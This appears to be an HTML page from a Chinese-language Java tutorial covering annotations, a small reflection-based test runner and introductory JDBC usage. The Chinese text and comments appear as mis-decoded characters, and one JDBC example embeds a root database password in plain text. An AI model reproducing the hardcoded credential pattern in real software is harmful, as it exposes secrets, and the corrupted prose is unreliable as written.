class="meta">@Deprecated</span><span class="comment">//è¡¨ç¤ºæ ‡æ³¨æ–¹æ³•å·²è¿‡æ—¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//æœ‰ç¼ºé™·</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@SuppressWarnings(&quot;all&quot;)</span><span class="comment">//å‹åˆ¶show2æ–¹æ³•çš„æ‰€æœ‰è­¦å‘Š</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show2</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//ä»£æ›¿show1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="è‡ªå®šä¹‰æ³¨è§£"><a href="#è‡ªå®šä¹‰æ³¨è§£" class="headerlink" title="è‡ªå®šä¹‰æ³¨è§£"></a>è‡ªå®šä¹‰æ³¨è§£</h3><h5 id="æ ¼å¼"><a href="#æ ¼å¼" class="headerlink" title="æ ¼å¼"></a>æ ¼å¼</h5><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">å…ƒæ³¨è§£</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> æ³¨è§£åç§°&#123;</span><br><span class="line">  å±æ€§åˆ—è¡¨</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ğŸŒ°</span></span><br><span class="line"><span class="meta">@Target(value=&#123;ElementType.TYPE&#125;)</span> <span class="comment">//è¯¥æ³¨è§£åªèƒ½ä½œç”¨ä¸ç±»ä¸Š</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> MyAnno &#123;</span><br><span class="line">    String <span class="title function_">name</span><span class="params">()</span> <span class="keyword">default</span> <span class="string">&quot;sqhy&quot;</span>;<span class="comment">//ä½¿ç”¨æ—¶å¯ä»¥ä¸ç”¨èµ‹å€¼ï¼Œé»˜è®¤ä¸ºsqhy</span></span><br><span class="line">    <span class="type">int</span> <span class="title function_">age</span><span class="params">()</span>;</span><br><span class="line">    Person <span class="title function_">per</span><span class="params">()</span>;</span><br><span class="line">    MyAnno2 <span class="title function_">anno2</span><span class="params">()</span>;</span><br><span class="line">    String[] strs();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>æœ¬è´¨æ˜¯ä¸€ä¸ªæ¥å£,é»˜è®¤ç»§æ‰¿è‡ªAnnotationæ¥å£ï¼Œè¯¥æ¥å£æ˜¯æ‰€æœ‰æ³¨é‡Šç±»å‹æ‰©å±•çš„å…¬å…±æ¥å£ï¼Œä½†å…¶æœ¬èº«ä¸å®šä¹‰æ³¨é‡Šç±»å‹</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> interface æ³¨è§£åç§° <span class="keyword">extends</span> <span class="title class_">java</span>.lang.annotation.Annotation &#123;&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h5 id="æ³¨è§£çš„å±æ€§â€“å¯å®šä¹‰çš„æˆå‘˜æ–¹æ³•-æ¥å£ä¸­çš„æŠ½è±¡æ–¹æ³•"><a href="#æ³¨è§£çš„å±æ€§â€“å¯å®šä¹‰çš„æˆå‘˜æ–¹æ³•-æ¥å£ä¸­çš„æŠ½è±¡æ–¹æ³•" class="headerlink" title="æ³¨è§£çš„å±æ€§â€“å¯å®šä¹‰çš„æˆå‘˜æ–¹æ³•(æ¥å£ä¸­çš„æŠ½è±¡æ–¹æ³•)"></a>æ³¨è§£çš„å±æ€§â€“å¯å®šä¹‰çš„æˆå‘˜æ–¹æ³•(æ¥å£ä¸­çš„æŠ½è±¡æ–¹æ³•)</h5><p>æ³¨è§£çš„å±æ€§ç±»ä¼¼ç±»çš„æˆå‘˜å˜é‡ï¼Œå–åå¯ä»¥å–æˆå˜é‡åï¼Œä½¿ç”¨æ—¶çš„æ‹¬å·ä¸­èµ‹å€¼</p><p><strong>è¦æ±‚</strong></p><ol><li><p>å±æ€§çš„è¿”å›ç±»å‹</p><ul><li>åŸºæœ¬æ•°æ®ç±»å‹</li><li>String</li><li>æšä¸¾</li><li>æ³¨è§£</li><li>ä»¥ä¸Šç±»å‹çš„æ•°ç»„</li></ul></li><li><p>å®šä¹‰äº†å±æ€§ï¼Œä½¿ç”¨æ—¶è¦èµ‹å€¼</p><ul><li><p>å¯ä»¥ä½¿ç”¨defaultå…³é”®å­—ç»™å±æ€§é»˜è®¤åˆå§‹åŒ–ï¼Œè¿™æ ·ä½¿ç”¨æ—¶å¯ä»¥ä¸ç”¨èµ‹å€¼</p></li><li><p>å¦‚æœåªæœ‰ä¸€ä¸ªå±æ€§è¦èµ‹å€¼ï¼Œå¹¶ä¸”åç§°å«valueï¼Œå¯ä»¥ç›´æ¥æ‹¬å·ä¸­å®šä¹‰å€¼</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MyAnno(12)</span></span><br></pre></td></tr></table></figure></div></li><li><p>æ•°ç»„èµ‹å€¼æ—¶ï¼Œå¤šä¸ªå…ƒç´ ç”¨{}åŒ…è£¹ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªå€¼å¯ä»¥çœç•¥{}</p></li></ul></li></ol><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MyAnno(age=12,per= Person.P1,anno2=@MyAnno2,strs=&#123;&quot;abc&quot;,&quot;sddw&quot;&#125;)</span></span><br></pre></td></tr></table></figure></div><h4 id="å…ƒæ³¨è§£"><a href="#å…ƒæ³¨è§£" class="headerlink" title="å…ƒæ³¨è§£"></a>å…ƒæ³¨è§£</h4><p>æè¿°æ³¨è§£çš„æ³¨è§£(å±æ€§åŸºæœ¬éƒ½å«valueï¼Œç±»å‹ä¸ºæšä¸¾)</p><ul><li><p>@Target ï¼šæè¿°æ³¨è§£èƒ½å¤Ÿä½œç”¨çš„ä½ç½®</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Target(value=&#123;ElementType.TYPE&#125;)</span> <span class="comment">//è¯¥æ³¨è§£åªèƒ½ä½œç”¨ä¸ç±»ä¸Š</span></span><br></pre></td></tr></table></figure></div><ul><li>ElementTypeå–å€¼<ul><li>TYPE:å¯ä»¥ä½œç”¨äºç±»ä¸Š</li><li>METHOD:å¯ä»¥ä½œç”¨äºæ–¹æ³•ä¸Š</li><li>FIELD:å¯ä»¥ä½œç”¨äºæˆå‘˜å˜é‡ä¸Š</li></ul></li></ul></li><li><p>@Retention :æè¿°æ³¨è§£èƒ½è¢«ä¿ç•™çš„é˜¶æ®µ</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span><span class="comment">//å½“å‰è¢«æè¿°æ³¨è§£ï¼Œä¼šä¿ç•™åˆ°classå­—èŠ‚ç æ–‡ä»¶ä¸­,å¹¶è¢«JVMè¯»å–åˆ°</span></span><br></pre></td></tr></table></figure></div></li><li><p>@Documented :æè¿°æ³¨è§£æ˜¯å¦è¢«æŠ½å–åˆ°apiæ–‡æ¡£ä¸­</p><blockquote><p>apiæ–‡æ¡£ï¼Œjavadocå‘½ä»¤ç”Ÿæˆçš„æ–‡æ¡£ï¼ˆä¸å¸®åŠ©æ‰‹å†Œä¸€æ ·ï¼‰</p></blockquote></li><li><p>@Inherited :æè¿°æ³¨è§£æ˜¯å¦è¢«å­ç±»ç»§æ‰¿</p></li></ul><h3 id="ç¨‹åºä¸­ä½¿ç”¨-è§£æ-æ³¨è§£"><a href="#ç¨‹åºä¸­ä½¿ç”¨-è§£æ-æ³¨è§£" class="headerlink" title="ç¨‹åºä¸­ä½¿ç”¨(è§£æ)æ³¨è§£"></a>ç¨‹åºä¸­ä½¿ç”¨(è§£æ)æ³¨è§£</h3><ol><li><p>è·å–æ³¨è§£å®šä¹‰çš„ä½ç½®ä¸‹çš„å¯¹è±¡ï¼ˆClassï¼ŒMethodï¼ŒFieldï¼‰</p></li><li><p>è·å–æŒ‡å®šæ³¨è§£</p><ul><li><p>getAnnotation(Class)</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pro</span> <span class="variable">an</span> <span class="operator">=</span> calculatorTestClass.getAnnotation(pro.class);</span><br><span class="line"><span class="comment">//å…¶å®å°±æ˜¯åœ¨å†…å­˜ä¸­ç”Ÿæˆç±»ä¸€ä¸ªè¯¥æ³¨è§£æ¥å£(pro)çš„å­ç±»å®ç°å¯¹è±¡</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProImpl</span> <span class="keyword">implements</span> <span class="title class_">pro</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">className</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> é…ç½®å€¼;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">methodName</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> é…ç½®å€¼;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ul></li><li><p>è°ƒç”¨æ³¨è§£ä¸­çš„æŠ½è±¡æ–¹æ³• è·å–é…ç½®çš„æ•°å€¼</p></li></ol><h3 id="ä¸€ä¸ªç®€å•çš„æµ‹è¯•æ¡†æ¶"><a href="#ä¸€ä¸ªç®€å•çš„æµ‹è¯•æ¡†æ¶" class="headerlink" title="ä¸€ä¸ªç®€å•çš„æµ‹è¯•æ¡†æ¶"></a>ä¸€ä¸ªç®€å•çš„æµ‹è¯•æ¡†æ¶</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Calculator.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calculator</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> a+b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> a-b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1+0=&quot;</span>+(<span class="number">1</span>+<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sub</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1-0=&quot;</span>+(<span class="number">1</span>-<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">mul</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1*0=&quot;</span>+(<span class="number">1</span>*<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Check</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">div</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1/0=&quot;</span>+(<span class="number">1</span>/<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ— bug&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//check.java</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(&#123;ElementType.METHOD, ElementType.TYPE&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Check &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æµ‹è¯•ç±»</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, IOException &#123;</span><br><span class="line">    <span class="comment">//ä¸€ä¸ªç®€å•çš„æµ‹è¯•æ¡†æ¶</span></span><br><span class="line">    Calculator c=<span class="keyword">new</span> <span class="title class_">Calculator</span>();</span><br><span class="line">    <span class="comment">//è·å–å­—èŠ‚ç å¯¹è±¡</span></span><br><span class="line">    Class cls=c.getClass();</span><br><span class="line">    <span class="comment">//è·å–æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line">    Method[] methods = cls.getMethods();</span><br><span class="line">    <span class="type">int</span> num=<span class="number">0</span>;<span class="comment">//å‡ºç°å¼‚å¸¸çš„æ¬¡æ•°</span></span><br><span class="line">    BufferedWriter bw=<span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;bug.txt&quot;</span>));</span><br><span class="line">    <span class="keyword">for</span>(Method m:methods)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//åˆ¤æ–­æ–¹æ³•ä¸Šæ˜¯å¦æœ‰Checkæ³¨è§£</span></span><br><span class="line">        <span class="keyword">if</span>(m.isAnnotationPresent(Check.class))&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                m.invoke(c);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">//æ•è·å¼‚å¸¸</span></span><br><span class="line">                <span class="comment">//è®°å½•æ–‡ä»¶ä¿¡æ¯</span></span><br><span class="line">                num++;</span><br><span class="line">                bw.write(m.getName()+<span class="string">&quot;æ–¹æ³•å‡ºå¼‚å¸¸äº†&quot;</span>);</span><br><span class="line">                bw.newLine();</span><br><span class="line">                bw.write(<span class="string">&quot;å¼‚å¸¸çš„åç§°ï¼š&quot;</span>+e.getCause().getClass().getSimpleName());<span class="comment">//å¾—åˆ°å¼‚å¸¸ç®€çŸ­ç±»åï¼ˆä¸å¸¦åŒ…åï¼‰</span></span><br><span class="line">                bw.newLine();</span><br><span class="line">                bw.write(<span class="string">&quot;å¼‚å¸¸çš„åŸå› ï¼š&quot;</span>+e.getCause().getMessage());</span><br><span class="line">                bw.newLine();</span><br><span class="line">                bw.write(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    bw.write(<span class="string">&quot;æœ¬æ¬¡å‡ºç°&quot;</span>+num+<span class="string">&quot;æ¬¡å¼‚å¸¸&quot;</span>);</span><br><span class="line">    bw.flush();</span><br><span class="line">    bw.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="JDBCâ€“Javaæ•°æ®åº“è¿æ¥"><a href="#JDBCâ€“Javaæ•°æ®åº“è¿æ¥" class="headerlink" title="JDBCâ€“Javaæ•°æ®åº“è¿æ¥"></a>JDBCâ€“Javaæ•°æ®åº“è¿æ¥</h1><h2 id="å®šä¹‰-1"><a href="#å®šä¹‰-1" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h2><p>ä½¿ç”¨ç»Ÿä¸€çš„ä¸€å¥—javaä»£ç å¯ä»¥æ“ä½œæ‰€æœ‰çš„å…³ç³»å‹æ•°æ®åº“</p><p>JDBC:å®šä¹‰äº†æ“ä½œæ‰€æœ‰å…³ç³»å‹æ•°æ®åº“çš„è§„åˆ™ï¼ˆæ¥å£ï¼‰</p><p>JDBCæœ¬è´¨ï¼šå®˜æ–¹ï¼ˆsunå…¬å¸ï¼‰å®šä¹‰çš„ä¸€å¥—æ“ä½œæ‰€æœ‰å…³ç³»å‹æ•°æ®åº“çš„è§„åˆ™ï¼Œå³æ¥å£ï¼Œå„ä¸ªæ•°æ®åº“å‚å•†è¶£å®ç°è¿™å¥—æ¥å£ï¼Œæä¾›æ•°æ®åº“é©±åŠ¨jaråŒ…ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™å¥—æ¥å£ï¼ˆJDBCï¼‰ç¼–ç¨‹ï¼ŒçœŸæ­£æ‰§è¡Œçš„ä»£ç æ˜¯é©±åŠ¨jaråŒ…ä¸­çš„å®ç°ç±»</p><blockquote><p>æ•°æ®åº“é©±åŠ¨ï¼šå³JDBCå®ç°ç±»ï¼ˆæŒ‰æ•°æ®åº“åˆ†ï¼‰ï¼Œç”±å„æ•°æ®åº“äº§å•†è‡ªå·±æä¾›å¯¹åº”ç‰ˆæœ¬</p></blockquote><h2 id="å¿«é€Ÿå…¥é—¨"><a href="#å¿«é€Ÿå…¥é—¨" class="headerlink" title="å¿«é€Ÿå…¥é—¨"></a>å¿«é€Ÿå…¥é—¨</h2><h3 id="æ­¥éª¤-1"><a href="#æ­¥éª¤-1" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h3><ul><li>å¯¼å…¥é©±åŠ¨jaråŒ…<ul><li>å¤åˆ¶jaråŒ…åˆ°é¡¹ç›®çš„libs(è‡ªå®šä¹‰)ç›®å½•ä¸‹</li><li>å³é”®â€“&gt;Add As Library</li></ul></li><li>æ³¨å†Œé©±åŠ¨</li><li>è·å–æ•°æ®åº“è¿æ¥å¯¹è±¡ Connection</li><li>å®šä¹‰sql</li><li>è·å–æ‰§è¡Œsqlè¯­å¥çš„å¯¹è±¡ Statement</li><li>æ‰§è¡Œsqlï¼Œæ¥å—è¿”å›ç»“æœ</li><li>å¤„ç†ç»“æœ</li><li>é‡Šæ”¾èµ„æº</li></ul><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">//å¯¼å…¥é©±åŠ¨jaråŒ…</span></span><br><span class="line">    <span class="comment">//æ³¨å†Œé©±åŠ¨</span></span><br><span class="line">    Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">    <span class="comment">//è·å–è¿æ¥å¯¹è±¡</span></span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(<span class="string">&quot;jdbc:mysql://localhost:3306/test&quot;</span>, <span class="string">&quot;root&quot;</span>, <span class="string">&quot;ZLL05311223&quot;</span>);</span><br><span class="line">    <span class="comment">//å®šä¹‰sqlè¯­å¥</span></span><br><span class="line">    String sql=<span class="string">&quot;update mystudy set id=4781 where value=1243&quot;</span>;</span><br><span class="line">    <span class="comment">//è·å–æ‰§è¡Œsqlçš„å¯¹è±¡</span></span><br><span class="line">    <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">    <span class="comment">//æ‰§è¡Œsql</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> stmt.executeUpdate(sql);</span><br><span class="line">    <span class="comment">//å¤„ç†ç»“æœ</span></span><br><span class="line">    System.out.println(count);</span><br><span class="line">    <span class="comment">//é‡Šæ”¾èµ„æº</span></span><br><span class="line">    stmt.close();</span><br><span class="line">    conn.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="å®ç°ç±»è¯¦è§£"><a href="#å®ç°ç±»è¯¦è§£" class="headerlink" title="å®ç°ç±»è¯¦è§£"></a>å®ç°ç±»è¯¦è§£</h2><h3 id="DriverManager"><a href="#DriverManager" class="headerlink" title="DriverManager"></a>DriverManager</h3><p>é©±åŠ¨ç®¡ç†å¯¹è±¡</p><h4 id="åŠŸèƒ½"><a href="#åŠŸèƒ½" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h4><ul><li><p>æ³¨å†Œé©±åŠ¨:å‘Šè¯‰ç¨‹åºä½¿ç”¨å“ªä¸€ä¸ªæ•°æ®åº“é©±åŠ¨jar</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å†™ä»£ç æ—¶</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);<span class="comment">//ç±»çš„å­—èŠ‚ç æ–‡ä»¶åŠ è½½è¿›å†…å­˜</span></span><br><span class="line"><span class="comment">//æ³¨å†Œé©±åŠ¨é™æ€æ–¹æ³•</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerDriver</span><span class="params">(Driver driver)</span>:æ³¨å†Œä¸ç»™å®šçš„é©±åŠ¨ç¨‹åº DriverManager</span><br></pre></td></tr></table></figure></div><blockquote><p>é€šè¿‡æŸ¥çœ‹æºç å‘ç°åœ¨com.mysql.cj.jdbc.Driverç±»ä¸­å­˜åœ¨é™æ€ä»£ç å—ï¼Œåœ¨å…¶ä¸­è¿è¡Œäº†æ³¨å†Œé©±åŠ¨é™æ€æ–¹æ³•ï¼Œè¯¥é™æ€ä»£ç å—åœ¨ç±»çš„å­—èŠ‚ç åŠ è½½è¿›å†…å­˜æ—¶è‡ªåŠ¨è¿è¡Œ</p><p>âš ï¸ï¼šå…¶å®åŠ è½½ç±»è¿™ä¸€æ­¥åœ¨mysql5åçš„é©±åŠ¨jaråŒ…å·²ç»å¸®æˆ‘ä»¬å…ˆåŠ è½½äº†ï¼Œå¯ä»¥ä¸å†™</p></blockquote></li><li><p>è·å–æ•°æ®åº“è¿æ¥</p><ul><li><p>æ–¹æ³•ststic Connection getConnection(String url,String user,String password)</p></li><li><p>å‚æ•°ï¼š</p><ul><li><p>urlï¼šæŒ‡å®šé“¾æ¥çš„è·¯å¾„</p><ul><li><p>è¯­æ³• <code>jdbc:mysql://ipåœ°å€(åŸŸå):ç«¯å£å·/æ•°æ®åº“åç§°</code> (ä»¥mysqlä¸ºä¾‹ï¼Œä¸åŒæ•°æ®åº“è¯­æ³•ä¸ä¸€æ ·)</p><blockquote><p>å¦‚æœè¿æ¥çš„æ˜¯æœ¬æœºmysqlï¼Œå¹¶ä¸”ç«¯å£ä¸º3306ï¼Œå¯ä»¥ç®€å†™ä¸º <code>jdbc:mysql:///æ•°æ®åº“åç§°</code></p></blockquote></li></ul></li><li><p>user ç”¨æˆ·å</p></li><li><p>password å¯†ç </p></li></ul></li></ul></li></ul><h3 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h3><p>æ•°æ®åº“è¿æ¥å¯¹è±¡</p><h4 id="åŠŸèƒ½-1"><a href="#åŠŸèƒ½-1" class="headerlink" title="åŠŸèƒ½"></a>åŠŸèƒ½</h4><ul><li>è·å–æ‰§è¡Œsqlçš„å¯¹è±¡<ul><li>Statement createStatement()</li><li>PrepareStatement prepareStatement(String sql)</li></ul></li><li>ç®¡ç†äº‹åŠ¡ï¼š<ul><li>å¼€å¯äº‹åŠ¡ void setAutoCommit(boolean autoCommit) :è°ƒç”¨è¯¥æ–¹æ³•è®¾ç½®å‚æ•°ä¸ºfalseï¼Œå³å¼€å¯äº‹åŠ¡</li><li>æäº¤äº‹åŠ¡ void commit()</li><li>å›æ»šäº‹åŠ¡ void rollback()</li></ul></li></ul><h3 id="Statement"><a href="#Statement" class="headerlink" title="Statement"></a>Statement</h3><p>æ‰§è¡Œsqlå¯¹è±¡(é™æ€sql)</p><ul><li>æ‰§è¡Œsql<ul><li>boolean execute(String sql) ï¼šå¯ä»¥æ‰§è¡Œä»»æ„sql ï¼ˆä¸å¸¸ç”¨ï¼‰</li><li>int executeUpdate(String sql) ï¼šå¯ä»¥æ‰§è¡ŒDMLï¼ˆå¢åˆ æ”¹ï¼‰è¯­å¥ã€DDLï¼ˆcreate, alter,dropï¼‰è¯­å¥ã€‚è¿”å›å€¼æ˜¯å½±å“çš„è¡Œæ•°ï¼Œè‹¥è¿”å›å€¼&gt;0åˆ™æ‰§è¡ŒæˆåŠŸ</li><li>ResultSet executeQuery(String sql) ï¼šæ‰§è¡ŒDQL(select)è¯­å¥</li></ul></li></ul><h3 id="ResultSet"><a href="#ResultSet" class="headerlink" title="ResultSet"></a>ResultSet</h3><p>ç»“æœé›†å¯¹è±¡ï¼Œå°è£…æŸ¥è¯¢ç»“æœ</p><ul><li>next() æ¸¸æ ‡å‘ä¸‹ç§»åŠ¨ä¸€è¡Œï¼Œè¿”å›å¸ƒå°”ç±»å‹ï¼Œåˆ¤æ–­å½“å‰è¡Œæ˜¯å¦æœ‰æ•°æ®ï¼Œtrueä¸ºæœ‰æ•°æ®</li><li>getXxxx(å‚æ•°) è·å–æ•°æ® (Xxxxè¡¨ç¤ºæ•°æ®ç±»å‹) e.g. getInt()<ul><li>å‚æ•°<ul><li>intå‹ è¡¨ç¤ºåˆ—çš„ç¼–å·ï¼Œä»å·¦åˆ°å³ ä»1å¼€å§‹</li><li>Stringå‹ è¡¨ç¤ºåˆ—åç§°</li></ul></li></ul></li></ul><h4 id="éå†å®ä¾‹"><a href="#éå†å®ä¾‹" class="headerlink" title="éå†å®ä¾‹"></a>éå†å®ä¾‹</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (rs.next())&#123;</span><br><span class="line">    <span class="comment">//å¾ªç¯åˆ¤æ–­æ˜¯å¦æœ‰æ•°æ®</span></span><br><span class="line">    <span class="comment">//è·å–æ•°æ®</span></span><br><span class="line">    <span class="type">int</span> id=rs.getInt(<span class="number">1</span>);</span><br><span class="line">    <span class="type">String</span> <span 